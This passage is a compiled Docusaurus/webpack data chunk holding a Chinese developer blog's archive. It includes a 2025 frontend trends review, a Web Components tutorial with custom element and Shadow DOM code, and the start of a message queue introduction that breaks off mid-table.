"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[8130],{2973:n=>{n.exports=JSON.parse('{"archive":{"blogPosts":[{"id":"frontend-trends-2025","metadata":{"permalink":"/blog/frontend-trends-2025","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2025-11-01-frontend-trends-2025.md","source":"@site/blog/2025-11-01-frontend-trends-2025.md","title":"2025 \u524d\u7aef\u6280\u672f\u8d8b\u52bf\u56de\u987e","description":"2025 \u5e74\u524d\u7aef\u6280\u672f\u7ee7\u7eed\u5feb\u901f\u53d1\u5c55\u3002\u672c\u6587\u56de\u987e\u4eca\u5e74\u7684\u91cd\u8981\u6280\u672f\u8d8b\u52bf\u548c\u53d8\u5316\u3002","date":"2025-11-01T00:00:00.000Z","tags":[{"inline":true,"label":"\u524d\u7aef","permalink":"/blog/tags/\u524d\u7aef"},{"inline":true,"label":"\u8d8b\u52bf","permalink":"/blog/tags/\u8d8b\u52bf"},{"inline":true,"label":"\u5e74\u5ea6\u603b\u7ed3","permalink":"/blog/tags/\u5e74\u5ea6\u603b\u7ed3"}],"readingTime":3.16,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"frontend-trends-2025","title":"2025 \u524d\u7aef\u6280\u672f\u8d8b\u52bf\u56de\u987e","authors":"mason","tags":["\u524d\u7aef","\u8d8b\u52bf","\u5e74\u5ea6\u603b\u7ed3"]},"unlisted":false,"nextItem":{"title":"Web Components \u5b9e\u8df5\u6307\u5357","permalink":"/blog/web-components"}},"content":"2025 \u5e74\u524d\u7aef\u6280\u672f\u7ee7\u7eed\u5feb\u901f\u53d1\u5c55\u3002\u672c\u6587\u56de\u987e\u4eca\u5e74\u7684\u91cd\u8981\u6280\u672f\u8d8b\u52bf\u548c\u53d8\u5316\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u5e74\u5ea6\u5173\u952e\u8bcd\\n\\n| \u8d8b\u52bf | \u8bf4\u660e |\\n|------|------|\\n| AI \u539f\u751f\u5f00\u53d1 | AI \u6df1\u5ea6\u878d\u5165\u5f00\u53d1\u6d41\u7a0b |\\n| \u8fb9\u7f18\u4f18\u5148 | Edge Computing \u6210\u4e3a\u4e3b\u6d41 |\\n| \u5168\u6808\u4e00\u4f53\u5316 | \u524d\u540e\u7aef\u8fb9\u754c\u66f4\u52a0\u6a21\u7cca |\\n| \u6027\u80fd\u6781\u81f4\u5316 | \u96f6 JavaScript \u6210\u4e3a\u53ef\u80fd |\\n\\n---\\n\\n## \ud83e\udd16 AI \u9a71\u52a8\u5f00\u53d1\\n\\n### AI \u7f16\u7a0b\u52a9\u624b\u666e\u53ca\\n\\n```markdown\\n2025 \u5e74\u53d8\u5316\uff1a\\n- GitHub Copilot \u6210\u4e3a\u6807\u914d\\n- Cursor \u7b49 AI IDE \u5d1b\u8d77\\n- AI \u4ee3\u7801\u5ba1\u67e5\u81ea\u52a8\u5316\\n- \u81ea\u7136\u8bed\u8a00\u751f\u6210\u7ec4\u4ef6\\n```\\n\\n### \u5bf9\u5f00\u53d1\u8005\u7684\u5f71\u54cd\\n\\n```markdown\\n\u65b0\u6280\u80fd\u8981\u6c42\uff1a\\n- Prompt Engineering\\n- AI \u5de5\u5177\u9009\u578b\u548c\u4f7f\u7528\\n- AI \u751f\u6210\u4ee3\u7801\u7684\u5ba1\u67e5\u80fd\u529b\\n- \u4eba\u673a\u534f\u4f5c\u7684\u5de5\u4f5c\u6d41\\n```\\n\\n---\\n\\n## \u26a1 \u6e32\u67d3\u6280\u672f\u6f14\u8fdb\\n\\n### React Server Components \u6210\u719f\\n\\n```tsx\\n// \u670d\u52a1\u5668\u7ec4\u4ef6\u6210\u4e3a\u9ed8\u8ba4\\nasync function ProductList() {\\n  const products = await db.products.findMany();\\n  \\n  return (\\n    <ul>\\n      {products.map(product => (\\n        <ProductCard key={product.id} product={product} />\\n      ))}\\n    </ul>\\n  );\\n}\\n```\\n\\n### \u96f6 JavaScript \u6846\u67b6\\n\\n```markdown\\n\u65b0\u5174\u6846\u67b6\uff1a\\n- Astro\uff1a\u5185\u5bb9\u7ad9\u70b9\u9996\u9009\\n- Qwik\uff1a\u6309\u9700\u52a0\u8f7d\u5230\u6781\u81f4\\n- HTMX\uff1a\u56de\u5f52 HTML\\n\\n\u5171\u540c\u7279\u70b9\uff1a\\n- \u9ed8\u8ba4\u96f6 JS\\n- \u670d\u52a1\u7aef\u6e32\u67d3\\n- \u6e10\u8fdb\u589e\u5f3a\\n```\\n\\n### Partial Hydration\\n\\n```tsx\\n// \u53ea\u6709\u4ea4\u4e92\u90e8\u5206\u9700\u8981 JS\\n<StaticContent />\\n<ClientOnly>\\n  <InteractiveWidget />\\n</ClientOnly>\\n<StaticContent />\\n```\\n\\n---\\n\\n## \ud83c\udf10 \u8fb9\u7f18\u8ba1\u7b97\\n\\n### Edge Runtime \u666e\u53ca\\n\\n```markdown\\n\u4e3b\u8981\u5e73\u53f0\uff1a\\n- Vercel Edge Functions\\n- Cloudflare Workers\\n- Deno Deploy\\n- AWS Lambda@Edge\\n\\n\u4f18\u52bf\uff1a\\n- \u4f4e\u5ef6\u8fdf\\n- \u5168\u7403\u5206\u5e03\\n- \u6309\u91cf\u8ba1\u8d39\\n```\\n\\n### \u8fb9\u7f18\u6570\u636e\u5e93\\n\\n```typescript\\n// Cloudflare D1 / Turso\\nconst db = drizzle(env.DB);\\n\\nexport default {\\n  async fetch(request, env) {\\n    const users = await db.select().from(users).all();\\n    return Response.json(users);\\n  },\\n};\\n```\\n\\n---\\n\\n## \ud83d\udd27 \u6784\u5efa\u5de5\u5177\\n\\n### Rust \u5de5\u5177\u94fe\u6210\u719f\\n\\n| \u5de5\u5177 | \u66ff\u4ee3 | \u6027\u80fd\u63d0\u5347 |\\n|------|------|---------|\\n| Turbopack | Webpack | 10x |\\n| SWC | Babel | 20x |\\n| Rspack | Webpack | 10x |\\n| Biome | ESLint + Prettier | 10x |\\n\\n### \u914d\u7f6e\u96f6\u5316\\n\\n```markdown\\n\u8d8b\u52bf\uff1a\\n- \u7ea6\u5b9a\u4f18\u4e8e\u914d\u7f6e\\n- \u6846\u67b6\u5185\u7f6e\u6700\u4f73\u5b9e\u8df5\\n- \u5f00\u7bb1\u5373\u7528\\n```\\n\\n---\\n\\n## \ud83c\udfa8 \u6837\u5f0f\u65b9\u6848\\n\\n### CSS-in-JS \u9000\u6f6e\\n\\n```markdown\\n2025 \u5e74\u8d8b\u52bf\uff1a\\n- \u8fd0\u884c\u65f6 CSS-in-JS \u51cf\u5c11\\n- \u96f6\u8fd0\u884c\u65f6\u65b9\u6848\u5d1b\u8d77\\n- \u539f\u5b50\u5316 CSS \u4e3b\u6d41\u5316\\n```\\n\\n### \u96f6\u8fd0\u884c\u65f6\u65b9\u6848\\n\\n```markdown\\n\u4e3b\u6d41\u65b9\u6848\uff1a\\n- Tailwind CSS\\n- Vanilla Extract\\n- Panda CSS\\n- StyleX (Meta)\\n```\\n\\n### CSS \u65b0\u7279\u6027\\n\\n```css\\n/* \u539f\u751f\u5d4c\u5957 */\\n.card {\\n  & .title {\\n    font-size: 1.5rem;\\n  }\\n}\\n\\n/* Container Queries */\\n@container (min-width: 400px) {\\n  .card {\\n    display: flex;\\n  }\\n}\\n\\n/* :has() \u9009\u62e9\u5668 */\\n.card:has(.image) {\\n  grid-template-columns: 200px 1fr;\\n}\\n```\\n\\n---\\n\\n## \ud83d\udcf1 \u8de8\u5e73\u53f0\u5f00\u53d1\\n\\n### React Native \u65b0\u67b6\u6784\\n\\n```markdown\\n\u65b0\u67b6\u6784\u4f18\u52bf\uff1a\\n- \u540c\u6b65\u6e32\u67d3\\n- \u6027\u80fd\u63d0\u5347\\n- \u66f4\u597d\u7684\u5e76\u53d1\u652f\u6301\\n- Fabric \u6e32\u67d3\u5668\\n```\\n\\n### Web \u80fd\u529b\u589e\u5f3a\\n\\n```markdown\\n\u65b0 Web API\uff1a\\n- File System Access\\n- Web Bluetooth\\n- Web USB\\n- Screen Wake Lock\\n```\\n\\n---\\n\\n## \ud83d\udd12 \u7c7b\u578b\u5b89\u5168\\n\\n### \u5168\u6808\u7c7b\u578b\u5b89\u5168\\n\\n```typescript\\n// tRPC / Hono RPC\\nconst router = t.router({\\n  user: t.router({\\n    get: t.procedure\\n      .input(z.object({ id: z.string() }))\\n      .query(({ input }) => getUser(input.id)),\\n  }),\\n});\\n\\n// \u5ba2\u6237\u7aef\u81ea\u52a8\u83b7\u5f97\u7c7b\u578b\\nconst user = await trpc.user.get.query({ id: \'1\' });\\n```\\n\\n### Schema \u7edf\u4e00\\n\\n```typescript\\n// Zod \u6210\u4e3a\u6807\u51c6\\nconst UserSchema = z.object({\\n  name: z.string().min(1),\\n  email: z.string().email(),\\n  age: z.number().optional(),\\n});\\n\\ntype User = z.infer<typeof UserSchema>;\\n```\\n\\n---\\n\\n## \ud83d\udce6 \u5305\u7ba1\u7406\\n\\n### pnpm \u6210\u4e3a\u4e3b\u6d41\\n\\n```markdown\\n2025 \u5e74\u683c\u5c40\uff1a\\n- pnpm\uff1a\u4f01\u4e1a\u9996\u9009\\n- npm\uff1a\u751f\u6001\u6700\u5e7f\\n- Bun\uff1a\u65b0\u5174\u52bf\u529b\\n```\\n\\n### Monorepo \u6807\u51c6\u5316\\n\\n```markdown\\n\u5de5\u5177\uff1a\\n- Turborepo\\n- Nx\\n- pnpm workspace\\n```\\n\\n---\\n\\n## \ud83c\udf93 \u5b66\u4e60\u5efa\u8bae\\n\\n### 2026 \u5e74\u5fc5\u5b66\\n\\n```markdown\\n\u6838\u5fc3\u6280\u80fd\uff1a\\n1. React Server Components\\n2. Edge Computing\\n3. AI \u8f85\u52a9\u5f00\u53d1\\n4. TypeScript \u8fdb\u9636\\n5. \u6027\u80fd\u4f18\u5316\\n\\n\u5efa\u8bae\u5173\u6ce8\uff1a\\n- \u6846\u67b6\u5e95\u5c42\u539f\u7406\\n- \u7f16\u8bd1\u65f6\u4f18\u5316\\n- \u670d\u52a1\u7aef\u6e32\u67d3\\n- \u53ef\u89c2\u6d4b\u6027\\n```\\n\\n### \u6280\u672f\u9009\u578b\u5efa\u8bae\\n\\n| \u573a\u666f | \u63a8\u8350 |\\n|------|------|\\n| \u65b0\u9879\u76ee | Next.js / Nuxt.js |\\n| \u5185\u5bb9\u7ad9 | Astro |\\n| \u5168\u6808\u5e94\u7528 | Next.js + Prisma |\\n| \u7ec4\u4ef6\u5e93 | Web Components |\\n| \u79fb\u52a8\u7aef | React Native |\\n\\n---\\n\\n## \ud83d\udcca \u603b\u7ed3\\n\\n```markdown\\n2025 \u5e74\u5173\u952e\u8d8b\u52bf\uff1a\\n\\n1. \u6e32\u67d3\u56de\u5f52\u670d\u52a1\u7aef\\n   - RSC \u6210\u4e3a\u9ed8\u8ba4\\n   - \u8fb9\u7f18\u6e32\u67d3\u666e\u53ca\\n\\n2. \u5f00\u53d1\u4f53\u9a8c\u4f18\u5316\\n   - AI \u52a9\u624b\u666e\u53ca\\n   - \u6784\u5efa\u901f\u5ea6\u63d0\u5347\\n   - \u914d\u7f6e\u7b80\u5316\\n\\n3. \u6027\u80fd\u6781\u81f4\u8ffd\u6c42\\n   - \u66f4\u5c11\u7684 JavaScript\\n   - \u66f4\u5feb\u7684\u52a0\u8f7d\\n   - \u66f4\u597d\u7684 Core Web Vitals\\n\\n4. \u5168\u6808\u878d\u5408\\n   - \u524d\u540e\u7aef\u8fb9\u754c\u6a21\u7cca\\n   - \u7c7b\u578b\u5b89\u5168\u8d2f\u7a7f\\n```\\n\\n---\\n\\n\u524d\u7aef\u6280\u672f\u65e5\u65b0\u6708\u5f02\uff0c\u4fdd\u6301\u5b66\u4e60\u3001\u5b9e\u8df5\u548c\u601d\u8003\u662f\u552f\u4e00\u4e0d\u53d8\u7684\u6cd5\u5219\u3002\\n\\n2026 \u5e74\uff0c\u6211\u4eec\u7ee7\u7eed\u524d\u884c\u3002"},{"id":"web-components","metadata":{"permalink":"/blog/web-components","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2025-10-01-web-components.md","source":"@site/blog/2025-10-01-web-components.md","title":"Web Components \u5b9e\u8df5\u6307\u5357","description":"Web Components \u662f\u6d4f\u89c8\u5668\u539f\u751f\u652f\u6301\u7684\u7ec4\u4ef6\u5316\u65b9\u6848\u3002\u672c\u6587\u4ecb\u7ecd Web Components \u7684\u6838\u5fc3\u6280\u672f\u548c\u5b9e\u8df5\u65b9\u6cd5\u3002","date":"2025-10-01T00:00:00.000Z","tags":[{"inline":true,"label":"Web Components","permalink":"/blog/tags/web-components"},{"inline":true,"label":"\u524d\u7aef","permalink":"/blog/tags/\u524d\u7aef"},{"inline":true,"label":"\u7ec4\u4ef6","permalink":"/blog/tags/\u7ec4\u4ef6"}],"readingTime":4.25,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"web-components","title":"Web Components \u5b9e\u8df5\u6307\u5357","authors":"mason","tags":["Web Components","\u524d\u7aef","\u7ec4\u4ef6"]},"unlisted":false,"prevItem":{"title":"2025 \u524d\u7aef\u6280\u672f\u8d8b\u52bf\u56de\u987e","permalink":"/blog/frontend-trends-2025"},"nextItem":{"title":"\u6d88\u606f\u961f\u5217\u5165\u95e8\u6307\u5357","permalink":"/blog/message-queue-intro"}},"content":"Web Components \u662f\u6d4f\u89c8\u5668\u539f\u751f\u652f\u6301\u7684\u7ec4\u4ef6\u5316\u65b9\u6848\u3002\u672c\u6587\u4ecb\u7ecd Web Components \u7684\u6838\u5fc3\u6280\u672f\u548c\u5b9e\u8df5\u65b9\u6cd5\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u4ec0\u4e48\u662f Web Components\\n\\nWeb Components \u7531\u4e09\u9879\u6280\u672f\u7ec4\u6210\uff1a\\n\\n| \u6280\u672f | \u8bf4\u660e |\\n|------|------|\\n| Custom Elements | \u81ea\u5b9a\u4e49 HTML \u5143\u7d20 |\\n| Shadow DOM | \u5c01\u88c5\u7684 DOM \u548c\u6837\u5f0f |\\n| HTML Templates | \u53ef\u590d\u7528\u7684 HTML \u6a21\u677f |\\n\\n### \u4f18\u52bf\\n\\n```markdown\\n- \u6d4f\u89c8\u5668\u539f\u751f\u652f\u6301\\n- \u6846\u67b6\u65e0\u5173\\n- \u771f\u6b63\u7684\u6837\u5f0f\u9694\u79bb\\n- \u53ef\u590d\u7528\u6027\u5f3a\\n```\\n\\n---\\n\\n## \ud83e\udde9 Custom Elements\\n\\n### \u5b9a\u4e49\u7ec4\u4ef6\\n\\n```javascript\\nclass MyButton extends HTMLElement {\\n  constructor() {\\n    super();\\n    this.attachShadow({ mode: \'open\' });\\n  }\\n\\n  connectedCallback() {\\n    this.render();\\n  }\\n\\n  render() {\\n    this.shadowRoot.innerHTML = `\\n      <style>\\n        button {\\n          padding: 8px 16px;\\n          background: #3b82f6;\\n          color: white;\\n          border: none;\\n          border-radius: 4px;\\n          cursor: pointer;\\n        }\\n        button:hover {\\n          background: #2563eb;\\n        }\\n      </style>\\n      <button>\\n        <slot></slot>\\n      </button>\\n    `;\\n  }\\n}\\n\\ncustomElements.define(\'my-button\', MyButton);\\n```\\n\\n### \u4f7f\u7528\\n\\n```html\\n<my-button>Click Me</my-button>\\n```\\n\\n### \u751f\u547d\u5468\u671f\\n\\n```javascript\\nclass MyComponent extends HTMLElement {\\n  constructor() {\\n    super();\\n    // \u5143\u7d20\u521b\u5efa\u65f6\u8c03\u7528\\n  }\\n\\n  connectedCallback() {\\n    // \u5143\u7d20\u6dfb\u52a0\u5230 DOM \u65f6\u8c03\u7528\\n  }\\n\\n  disconnectedCallback() {\\n    // \u5143\u7d20\u4ece DOM \u79fb\u9664\u65f6\u8c03\u7528\\n  }\\n\\n  attributeChangedCallback(name, oldValue, newValue) {\\n    // \u5c5e\u6027\u53d8\u5316\u65f6\u8c03\u7528\\n  }\\n\\n  adoptedCallback() {\\n    // \u5143\u7d20\u88ab\u79fb\u52a8\u5230\u65b0\u6587\u6863\u65f6\u8c03\u7528\\n  }\\n\\n  static get observedAttributes() {\\n    // \u58f0\u660e\u8981\u76d1\u542c\u7684\u5c5e\u6027\\n    return [\'disabled\', \'size\'];\\n  }\\n}\\n```\\n\\n---\\n\\n## \ud83c\udf11 Shadow DOM\\n\\n### \u521b\u5efa Shadow DOM\\n\\n```javascript\\nclass MyCard extends HTMLElement {\\n  constructor() {\\n    super();\\n    // open: \u53ef\u901a\u8fc7 JavaScript \u8bbf\u95ee\\n    // closed: \u4e0d\u53ef\u8bbf\u95ee\\n    const shadow = this.attachShadow({ mode: \'open\' });\\n    \\n    shadow.innerHTML = `\\n      <style>\\n        :host {\\n          display: block;\\n          padding: 16px;\\n          border-radius: 8px;\\n          box-shadow: 0 2px 8px rgba(0,0,0,0.1);\\n        }\\n        :host([theme=\\"dark\\"]) {\\n          background: #1f2937;\\n          color: white;\\n        }\\n        ::slotted(h2) {\\n          margin-top: 0;\\n        }\\n      </style>\\n      <slot></slot>\\n    `;\\n  }\\n}\\n```\\n\\n### \u6837\u5f0f\u9009\u62e9\u5668\\n\\n```css\\n/* \u5bbf\u4e3b\u5143\u7d20 */\\n:host {\\n  display: block;\\n}\\n\\n/* \u5e26\u6761\u4ef6\u7684\u5bbf\u4e3b */\\n:host([disabled]) {\\n  opacity: 0.5;\\n}\\n\\n:host(:hover) {\\n  box-shadow: 0 4px 12px rgba(0,0,0,0.15);\\n}\\n\\n/* \u5bbf\u4e3b\u4e0a\u4e0b\u6587 */\\n:host-context(.dark-theme) {\\n  background: #333;\\n}\\n\\n/* \u63d2\u69fd\u5185\u5bb9 */\\n::slotted(*) {\\n  margin: 0;\\n}\\n\\n::slotted(p) {\\n  color: gray;\\n}\\n```\\n\\n---\\n\\n## \ud83d\udcdd HTML Templates\\n\\n### \u4f7f\u7528\u6a21\u677f\\n\\n```html\\n<template id=\\"my-template\\">\\n  <style>\\n    .card {\\n      padding: 16px;\\n      border: 1px solid #ddd;\\n    }\\n  </style>\\n  <div class=\\"card\\">\\n    <slot name=\\"title\\"></slot>\\n    <slot></slot>\\n  </div>\\n</template>\\n\\n<script>\\nclass TemplateCard extends HTMLElement {\\n  constructor() {\\n    super();\\n    const shadow = this.attachShadow({ mode: \'open\' });\\n    const template = document.getElementById(\'my-template\');\\n    shadow.appendChild(template.content.cloneNode(true));\\n  }\\n}\\n\\ncustomElements.define(\'template-card\', TemplateCard);\\n<\/script>\\n```\\n\\n### \u547d\u540d\u63d2\u69fd\\n\\n```html\\n<template-card>\\n  <h2 slot=\\"title\\">Card Title</h2>\\n  <p>This is the card content.</p>\\n</template-card>\\n```\\n\\n---\\n\\n## \ud83d\udd27 \u5c5e\u6027\u548c\u4e8b\u4ef6\\n\\n### \u5c5e\u6027\u5904\u7406\\n\\n```javascript\\nclass MyInput extends HTMLElement {\\n  static get observedAttributes() {\\n    return [\'value\', \'placeholder\', \'disabled\'];\\n  }\\n\\n  constructor() {\\n    super();\\n    this.attachShadow({ mode: \'open\' });\\n  }\\n\\n  connectedCallback() {\\n    this.render();\\n  }\\n\\n  attributeChangedCallback(name, oldValue, newValue) {\\n    if (oldValue !== newValue) {\\n      this.render();\\n    }\\n  }\\n\\n  // Getter/Setter \u5c5e\u6027\\n  get value() {\\n    return this.getAttribute(\'value\') || \'\';\\n  }\\n\\n  set value(val) {\\n    this.setAttribute(\'value\', val);\\n  }\\n\\n  get disabled() {\\n    return this.hasAttribute(\'disabled\');\\n  }\\n\\n  set disabled(val) {\\n    if (val) {\\n      this.setAttribute(\'disabled\', \'\');\\n    } else {\\n      this.removeAttribute(\'disabled\');\\n    }\\n  }\\n\\n  render() {\\n    this.shadowRoot.innerHTML = `\\n      <style>\\n        input {\\n          padding: 8px;\\n          border: 1px solid #ddd;\\n          border-radius: 4px;\\n        }\\n        input:disabled {\\n          background: #f5f5f5;\\n        }\\n      </style>\\n      <input \\n        type=\\"text\\" \\n        value=\\"${this.value}\\"\\n        placeholder=\\"${this.getAttribute(\'placeholder\') || \'\'}\\"\\n        ${this.disabled ? \'disabled\' : \'\'}\\n      >\\n    `;\\n\\n    this.shadowRoot.querySelector(\'input\').addEventListener(\'input\', (e) => {\\n      this.value = e.target.value;\\n      this.dispatchEvent(new CustomEvent(\'change\', {\\n        detail: { value: this.value },\\n        bubbles: true,\\n      }));\\n    });\\n  }\\n}\\n```\\n\\n### \u81ea\u5b9a\u4e49\u4e8b\u4ef6\\n\\n```javascript\\n// \u7ec4\u4ef6\u5185\u89e6\u53d1\\nthis.dispatchEvent(new CustomEvent(\'item-selected\', {\\n  detail: { id: itemId, name: itemName },\\n  bubbles: true,\\n  composed: true, // \u7a7f\u900f Shadow DOM\\n}));\\n\\n// \u5916\u90e8\u76d1\u542c\\ndocument.querySelector(\'my-list\').addEventListener(\'item-selected\', (e) => {\\n  console.log(\'Selected:\', e.detail);\\n});\\n```\\n\\n---\\n\\n## \ud83c\udfa8 \u6837\u5f0f\u5b9a\u5236\\n\\n### CSS \u53d8\u91cf\\n\\n```javascript\\nclass ThemedButton extends HTMLElement {\\n  constructor() {\\n    super();\\n    this.attachShadow({ mode: \'open\' });\\n    this.shadowRoot.innerHTML = `\\n      <style>\\n        button {\\n          padding: var(--btn-padding, 8px 16px);\\n          background: var(--btn-bg, #3b82f6);\\n          color: var(--btn-color, white);\\n          border: none;\\n          border-radius: var(--btn-radius, 4px);\\n        }\\n      </style>\\n      <button><slot></slot></button>\\n    `;\\n  }\\n}\\n```\\n\\n```html\\n<style>\\n  themed-button {\\n    --btn-bg: #10b981;\\n    --btn-radius: 20px;\\n  }\\n</style>\\n\\n<themed-button>Custom Button</themed-button>\\n```\\n\\n### CSS Parts\\n\\n```javascript\\nthis.shadowRoot.innerHTML = `\\n  <style>\\n    .container {\\n      display: flex;\\n    }\\n  </style>\\n  <div class=\\"container\\">\\n    <span part=\\"label\\">Label</span>\\n    <span part=\\"value\\">Value</span>\\n  </div>\\n`;\\n```\\n\\n```css\\n/* \u5916\u90e8\u53ef\u4ee5\u901a\u8fc7 part \u9009\u62e9\u5668\u4fee\u6539\u6837\u5f0f */\\nmy-component::part(label) {\\n  font-weight: bold;\\n}\\n\\nmy-component::part(value) {\\n  color: blue;\\n}\\n```\\n\\n---\\n\\n## \ud83d\udce6 \u5b9e\u7528\u7ec4\u4ef6\u793a\u4f8b\\n\\n### Modal \u7ec4\u4ef6\\n\\n```javascript\\nclass MyModal extends HTMLElement {\\n  constructor() {\\n    super();\\n    this.attachShadow({ mode: \'open\' });\\n  }\\n\\n  connectedCallback() {\\n    this.render();\\n  }\\n\\n  static get observedAttributes() {\\n    return [\'open\'];\\n  }\\n\\n  attributeChangedCallback() {\\n    this.render();\\n  }\\n\\n  get open() {\\n    return this.hasAttribute(\'open\');\\n  }\\n\\n  set open(val) {\\n    if (val) {\\n      this.setAttribute(\'open\', \'\');\\n    } else {\\n      this.removeAttribute(\'open\');\\n    }\\n  }\\n\\n  render() {\\n    this.shadowRoot.innerHTML = `\\n      <style>\\n        :host {\\n          display: ${this.open ? \'block\' : \'none\'};\\n        }\\n        .backdrop {\\n          position: fixed;\\n          top: 0;\\n          left: 0;\\n          right: 0;\\n          bottom: 0;\\n          background: rgba(0,0,0,0.5);\\n          display: flex;\\n          align-items: center;\\n          justify-content: center;\\n        }\\n        .modal {\\n          background: white;\\n          padding: 24px;\\n          border-radius: 8px;\\n          min-width: 300px;\\n        }\\n      </style>\\n      <div class=\\"backdrop\\">\\n        <div class=\\"modal\\">\\n          <slot></slot>\\n        </div>\\n      </div>\\n    `;\\n\\n    this.shadowRoot.querySelector(\'.backdrop\').addEventListener(\'click\', (e) => {\\n      if (e.target.classList.contains(\'backdrop\')) {\\n        this.open = false;\\n        this.dispatchEvent(new CustomEvent(\'close\'));\\n      }\\n    });\\n  }\\n}\\n\\ncustomElements.define(\'my-modal\', MyModal);\\n```\\n\\n---\\n\\n## \ud83d\udccb \u4e0e\u6846\u67b6\u96c6\u6210\\n\\n### React\\n\\n```tsx\\nimport { useRef, useEffect } from \'react\';\\n\\nfunction App() {\\n  const modalRef = useRef<HTMLElement>(null);\\n\\n  useEffect(() => {\\n    const modal = modalRef.current;\\n    const handleClose = () => console.log(\'Modal closed\');\\n    modal?.addEventListener(\'close\', handleClose);\\n    return () => modal?.removeEventListener(\'close\', handleClose);\\n  }, []);\\n\\n  return (\\n    <my-modal ref={modalRef} open>\\n      <h2>Hello!</h2>\\n    </my-modal>\\n  );\\n}\\n```\\n\\n### Vue\\n\\n```vue\\n<template>\\n  <my-modal :open=\\"isOpen\\" @close=\\"isOpen = false\\">\\n    <h2>Hello!</h2>\\n  </my-modal>\\n</template>\\n```\\n\\n---\\n\\n## \u2705 \u6700\u4f73\u5b9e\u8df5\\n\\n```markdown\\n1. \u4f7f\u7528\u8bed\u4e49\u5316\u7684\u7ec4\u4ef6\u540d\uff08\u5e26\u8fde\u5b57\u7b26\uff09\\n2. \u63d0\u4f9b\u5408\u7406\u7684\u9ed8\u8ba4\u6837\u5f0f\\n3. \u4f7f\u7528 CSS \u53d8\u91cf\u652f\u6301\u4e3b\u9898\u5b9a\u5236\\n4. \u6587\u6863\u5316\u5c5e\u6027\u3001\u4e8b\u4ef6\u548c\u63d2\u69fd\\n5. \u6ce8\u610f\u65e0\u969c\u788d\u8bbf\u95ee\\n```\\n\\n---\\n\\nWeb Components \u662f\u6784\u5efa\u53ef\u590d\u7528 UI \u7ec4\u4ef6\u7684\u6807\u51c6\u65b9\u6848\uff0c\u7279\u522b\u9002\u5408\u8de8\u6846\u67b6\u5171\u4eab\u7684\u573a\u666f\u3002"},{"id":"message-queue-intro","metadata":{"permalink":"/blog/message-queue-intro","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2025-09-01-message-queue.md","source":"@site/blog/2025-09-01-message-queue.md","title":"\u6d88\u606f\u961f\u5217\u5165\u95e8\u6307\u5357","description":"\u6d88\u606f\u961f\u5217\u662f\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\u7684\u91cd\u8981\u7ec4\u4ef6\u3002\u672c\u6587\u4ecb\u7ecd\u6d88\u606f\u961f\u5217\u7684\u6838\u5fc3\u6982\u5ff5\u548c\u5e38\u89c1\u4f7f\u7528\u573a\u666f\u3002","date":"2025-09-01T00:00:00.000Z","tags":[{"inline":true,"label":"\u6d88\u606f\u961f\u5217","permalink":"/blog/tags/\u6d88\u606f\u961f\u5217"},{"inline":true,"label":"\u540e\u7aef","permalink":"/blog/tags/\u540e\u7aef"},{"inline":true,"label":"\u67b6\u6784","permalink":"/blog/tags/\u67b6\u6784"}],"readingTime":4.09,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"message-queue-intro","title":"\u6d88\u606f\u961f\u5217\u5165\u95e8\u6307\u5357","authors":"mason","tags":["\u6d88\u606f\u961f\u5217","\u540e\u7aef","\u67b6\u6784"]},"unlisted":false,"prevItem":{"title":"Web Components \u5b9e\u8df5\u6307\u5357","permalink":"/blog/web-components"},"nextItem":{"title":"\u79fb\u52a8\u7aef H5 \u5f00\u53d1\u6280\u5de7","permalink":"/blog/h5-mobile-development"}},"content":"\u6d88\u606f\u961f\u5217\u662f\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\u7684\u91cd\u8981\u7ec4\u4ef6\u3002\u672c\u6587\u4ecb\u7ecd\u6d88\u606f\u961f\u5217\u7684\u6838\u5fc3\u6982\u5ff5\u548c\u5e38\u89c1\u4f7f\u7528\u573a\u666f\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u4ec0\u4e48\u662f\u6d88\u606f\u961f\u5217\\n\\n```markdown\\n\u6d88\u606f\u961f\u5217 (MQ) = \u751f\u4ea7\u8005 \u2192 \u961f\u5217 \u2192 \u6d88\u8d39\u8005\\n\\n\u6838\u5fc3\u6982\u5ff5\uff1a\\n- Producer\uff08\u751f\u4ea7\u8005\uff09\uff1a\u53d1\u9001\u6d88\u606f\\n- Consumer\uff08\u6d88\u8d39\u8005\uff09\uff1a\u63a5\u6536\u6d88\u606f\\n- Queue\uff08\u961f\u5217\uff09\uff1a\u5b58\u50a8\u6d88\u606f\\n- Broker\uff08\u4ee3\u7406\uff09\uff1a\u6d88\u606f\u670d\u52a1\u5668\\n```\\n\\n### \u4e3a\u4ec0\u4e48\u9700\u8981\u6d88\u606f\u961f\u5217\\n\\n| \u4f5c\u7528 | \u8bf4\u660e |\\n|------|------|\\n| \u89e3\u8026 | \u670d\u52a1\u4e4b\u95f4\u4e0d\u76f4\u63a5\u4f9d\u8d56 |\\n| \u5f02\u6b65 | \u975e\u6838\u5fc3\u6d41\u7a0b\u5f02\u6b65\u5904\u7406 |\\n| \u524a\u5cf0 | \u7f13\u51b2\u7a81\u53d1\u6d41\u91cf |\\n| \u53ef\u9760 | \u6d88\u606f\u6301\u4e45\u5316\uff0c\u4e0d\u4e22\u5931 |\\n\\n---\\n\\n## \ud83d\udcca \u5e38\u89c1\u6d88\u606f\u961f\u5217\\n\\n| \u4ea7\u54c1 | \u7279\u70b9 | 